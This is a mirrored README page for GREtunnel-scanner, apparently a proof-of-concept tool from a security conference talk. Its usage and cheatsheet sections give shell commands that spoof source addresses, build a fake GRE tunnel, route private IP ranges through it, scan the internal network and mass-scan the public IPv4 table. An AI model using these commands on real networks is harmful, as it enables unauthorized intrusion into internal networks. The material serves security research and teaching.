<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GREtunnel-scanner - This is a GRE PoC code for the talk: From Spoofing to Tunneling: New Red Team Networking Techniques for Initial Access and Evasion.</title>
    <meta name="description" content="This is a GRE PoC code for the talk: From Spoofing to Tunneling: New Red Team Networking Techniques for Initial Access and Evasion.">
    <meta name="keywords" content="GREtunnel-scanner, English, documentation, GitHub, open source">
    <meta name="author" content="OpenAiTx">
    <meta name="robots" content="index, follow">
    
    <!-- Structured Data -->
    <script type="application/ld+json">
    {
  "@context": "https://schema.org",
  "@type": "SoftwareApplication",
  "name": "GREtunnel-scanner",
  "description": "This is a GRE PoC code for the talk: From Spoofing to Tunneling: New Red Team Networking Techniques for Initial Access and Evasion.",
  "author": {
    "@type": "Person",
    "name": "123ojp"
  },
  "applicationCategory": "DeveloperApplication",
  "operatingSystem": "Any",
  "offers": {
    "@type": "Offer",
    "price": "0",
    "priceCurrency": "USD"
  },
  "aggregateRating": {
    "@type": "AggregateRating",
    "ratingValue": "5",
    "ratingCount": 80
  },
  "url": "https://OpenAiTx.github.io/projects/123ojp/GREtunnel-scanner/README-en.html",
  "sameAs": "https://raw.githubusercontent.com/123ojp/GREtunnel-scanner/main/README.md",
  "datePublished": "2025-10-11",
  "dateModified": "2025-10-11"
}
    </script>
    
    <!-- GitHub-style CSS -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            line-height: 1.6;
            color: #24292e;
            background-color: #ffffff;
            max-width: 980px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .container {
            background: #ffffff;
            border: 1px solid #e1e4e8;
            border-radius: 6px;
            padding: 24px;
            margin-bottom: 20px;
        }
        
        .header {
            border-bottom: 1px solid #e1e4e8;
            padding-bottom: 16px;
            margin-bottom: 24px;
        }
        
        .project-title {
            font-size: 2em;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .project-title a {
            color: #24292e;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: color 0.2s ease;
        }
        
        .project-title a:hover {
            color: #0366d6;
            text-decoration: none;
        }
        
        .project-title .github-icon {
            width: 1em;
            height: 1em;
            fill: currentColor;
            opacity: 0.7;
            transition: opacity 0.2s ease;
        }
        
        .project-title a:hover .github-icon {
            opacity: 1;
        }
        
        .project-meta {
            color: #586069;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .stars {
            display: inline-block;
            margin-right: 16px;
        }
        
        .language {
            display: inline-block;
            background-color: #f1f8ff;
            color: #0366d6;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: 500;
        }
        
        .content {
            font-size: 16px;
            line-height: 1.6;
        }
        
        h1, h2, h3, h4, h5, h6 {
            margin-top: 24px;
            margin-bottom: 16px;
            font-weight: 600;
            line-height: 1.25;
            color: #24292e;
        }
        
        h1 { font-size: 2em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
        h2 { font-size: 1.5em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
        h3 { font-size: 1.25em; }
        
        p {
            margin-bottom: 16px;
        }
        
        code {
            background-color: #f6f8fa;
            border-radius: 3px;
            font-size: 85%;
            margin: 0;
            padding: 0.2em 0.4em;
            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
        }
        
        pre {
            background-color: #f6f8fa;
            border-radius: 6px;
            font-size: 85%;
            line-height: 1.45;
            overflow: auto;
            padding: 16px;
            margin-bottom: 16px;
        }
        
        pre code {
            background-color: transparent;
            border: 0;
            display: inline;
            line-height: inherit;
            margin: 0;
            overflow: visible;
            padding: 0;
            word-wrap: normal;
        }
        
        a {
            color: #0366d6;
            text-decoration: none;
        }
        
        a:hover {
            text-decoration: underline;
        }
        
        ul, ol {
            margin-bottom: 16px;
            padding-left: 2em;
        }
        
        li {
            margin-bottom: 0.25em;
        }
        
        blockquote {
            border-left: 4px solid #dfe2e5;
            color: #6a737d;
            margin: 0 0 16px 0;
            padding: 0 1em;
        }
        
        .footer {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #e1e4e8;
            color: #586069;
            font-size: 14px;
            text-align: center;
        }
        
        .footer a {
            color: #0366d6;
        }
        
        .original-link {
            margin-top: 16px;
            padding: 12px;
            background-color: #f6f8fa;
            border-radius: 6px;
            border: 1px solid #e1e4e8;
        }
        
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .container {
                padding: 16px;
            }
            
            .project-title {
                font-size: 1.5em;
            }
        }
    </style>
    
    <!-- Prism.js for syntax highlighting -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>

    <!-- Bing Count -->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "sh95yd6uwt");
    </script>        

    <!-- Statcounter -->
    <script type="text/javascript">
        var sc_project = 13142514;
        var sc_invisible = 1;
        var sc_security = "d03a31d8"; 
    </script>
    <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
    <noscript>
        <div class="statcounter"><a title="Web Analytics" href="https://statcounter.com/" target="_blank"><img
                    class="statcounter" src="https://c.statcounter.com/13142514/0/d03a31d8/1/" alt="Web Analytics"
                    referrerPolicy="no-referrer-when-downgrade"></a></div>
    </noscript>    
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="project-title">
                <a href="https://github.com/123ojp/GREtunnel-scanner" target="_blank" rel="noopener noreferrer">
                    <svg class="github-icon" viewBox="0 0 16 16" aria-hidden="true">
                        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
                    </svg>
                    GREtunnel-scanner
                </a>
            </h1>
            <div class="project-meta">
                <span class="stars">⭐ 80 stars</span>
                <span class="language">English</span>
                <span>by 123ojp</span>
            </div>
        </div>
        
        <div class="content">
            <h1>GRE tunnel Scanner</h1>
<h2>⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️</h2>
<h3>⚠️This tool includes spoofing source IP addresses. Please ensure you have legal authorization to use it.⚠️</h3>
<h2>Reference</h2>
<ul><li>This is a PoC code for Talks: From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion</li>
    <li><a href="https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678" target="_blank" rel="noopener noreferrer">Black Hat USA 2025 Briefing</a></li>
    <li><a href="https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316" target="_blank" rel="noopener noreferrer">DEF CON 33 Main Stage</a></li>
    <li><a href="https://hitcon.org/2025/en-US/agenda/" target="_blank" rel="noopener noreferrer">HITCON 2025</a></li>
</ul><h2>Prepare</h2>
<ul><li><code>pip3 install requirement.txt</code></li>
</ul><h2>Usage</h2>
<pre><code class="language-">python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile></code></pre>
<h2>Example</h2>
<ul><li>for example <code>1.1.1.1</code> and <code>2.2.2.2</code> have a GRE tunnel to <code>3.3.3.3</code></li>
</ul><pre><code class="language-">python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1</code></pre>
<ul><li>And get how to abuse GRE tunnel</li>
</ul><pre><code class="language-">python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280</p><h2>route possible private ip ##</h2>
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP</p><h3>start scan intranet ###</h3>
#### !IMPORTANT! ####
<h1>!! nmap is not available for this kind of attack use fping instead !! #</h1>
<h1>fping -g 192.168.0.0/16</h1></p><h3>cleanup ###</h3>
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1</code></pre></p><ul><li>if you know the endpoint but don't know the peer address you can do somethin like this</li>
  <li><code>python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8</code></li>
  <li>you well get reply from 8.8.8.8 while you get the right peer</li></p><p><li>default setting about 500 package/sec.</li>
</ul><h2>options</h2>
<ul><li><code>-sch</code>: Show Cheatsheet and exit (Input -i -lh -s -d which you found then get abuse GRE tunnel command)</li>
<li><code>-l3</code>: Layer 3 tunnel interface (Default: False)</li>
<li><code>-r</code>: Place GRE dest IP information in ICMP (Default: Place GRE src IP information)</li>
<li><code>-ss</code>: Save and use status file (the last scan will resume) (Default: False)</li>
  <li>Recommend "on" in mass scan system sometime kill the script</li>
<li><code>-i <interface></code>: Interface to send packet</li>
<li><code>-s <ip_or_file></code>: An IP subnet or a list of IPs(subnets) to use as GRE src</li>
<li><code>-d <ip_or_file></code>: An IP subnet or a list of IPs(subnets) to use as GRE dst</li>
<li><code>-L <file></code>: scan a list of GRE peers</li>
  <li>file every line look like this <code>1.1.1.1,2.2.2.2</code></li>
<li><code>-lh <ip></code>: An IP on your public interface (the IP on -i interface)</li>
<li><code>-o <file></code>: Log file path</li>
<li><code>-t <float></code>: Wait how many seconds after GRE packet send (Default: 2)</li>
<li><code>-T <int></code>: How many threads send GRE packet at the same time (Default: 255)</li>
<li><code>-cs <int></code>: Send how many IP until start wait for ping to respond (default: 1000)</li>
<li><code>-dp</code>: Do private - scan private IP GRE (Default: False)</li>
<li><code>-id <ip></code>: Inside ICMP dst address (Default: same as GRE dst) </li>
  <li>Use this if you know the inside intranet address</li>
<li><code>-v <log_level></code>: Logging level <code>['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']</code> (Default: INFO)</li>
  <li>GRE peer found log is on <code>CRITICAL</code></li></p><p>
</ul><h2>better way to scan full public ip</h2>
<pre><code class="language-">wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss</code></pre></p><h2>Lab</h2>
<h3>Demo video</h3>
<ul><li><a href="https://youtu.be/DDvfYl5-J28" target="_blank" rel="noopener noreferrer">Youtube</a></li>
</ul><h3>Scan GRE tunnel</h3>
<code>python3 main.py -i <iface> -lh <your_ip> -s 1.1.1.1 -d 160.25.104.199</code>
<h3>Access & Scan intranet</h3>
<pre><code class="language-">#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
<h3>start scan intranet ###</h3>
fping -g 192.168.0.0/16</p><p>##### scan output #####
<h1>192.168.1.2 is alive</h1></p><h2>test curl to web ##</h2>
curl 192.168.1.2
<h1>YOU KNOW GRE!</h1></p><p>#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1</code></pre></p><h2>Disclaimer</h2>
This project is intended for educational and research purposes only. Any actions and/or activities related to this code are solely your responsibility. The authors and contributors are not responsible for any misuse or damage caused by this project. Please ensure that you have proper authorization before testing, using, or deploying any part of this code in any environment. Unauthorized use of this code may violate local, state, and federal laws.</p><h2>License</h2>
This project is licensed under the terms of the MIT license.</p><p>
---

Tranlated By <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">Open Ai Tx</a> | Last indexed: 2025-10-11

---</p>
        </div>
        
        <div class="original-link">
            <strong>Original README:</strong> <a href="https://raw.githubusercontent.com/123ojp/GREtunnel-scanner/main/README.md" target="_blank" rel="noopener noreferrer">View on GitHub</a>
        </div>
    </div>
    
    <div class="footer">
        <p>Translated by <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">OpenAiTx</a> | 
        Last updated: 2025-10-11 
    </div>
    
</body>
</html>